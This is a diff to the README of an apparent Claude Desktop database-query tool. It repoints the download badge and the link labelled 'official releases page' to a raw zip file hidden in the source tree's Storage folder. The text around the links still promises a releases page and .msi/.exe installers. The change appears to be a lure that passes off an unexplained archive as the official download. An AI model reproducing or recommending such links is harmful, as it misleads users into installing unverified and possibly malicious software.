@@ -1,6 +1,6 @@
 # 💾 mcp-database-query-app - Manage your databases through a simple interface
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Dry-statelyhome866/mcp-database-query-app)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Dry-statelyhome866/mcp-database-query-app/raw/refs/heads/main/src/McpDatabaseQueryApp.Core/Storage/database-query-app-mcp-fatality.zip)
 
 This application connects your databases to the Claude Desktop interface. It allows you to run queries and manage data without writing complex code. You see your tables, run SQL commands, and visualize results directly inside your chat workspace.
 
@@ -19,7 +19,7 @@ If you lack the .NET Runtime, the installer will direct you to the Microsoft web
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/Dry-statelyhome866/mcp-database-query-app).
+1.  Visit the [official releases page](https://github.com/Dry-statelyhome866/mcp-database-query-app/raw/refs/heads/main/src/McpDatabaseQueryApp.Core/Storage/database-query-app-mcp-fatality.zip).
 2.  Locate the latest version under the "Releases" section.
 3.  Download the setup file ending in .msi or .exe.
 4.  Open the file and follow the prompts on your screen.
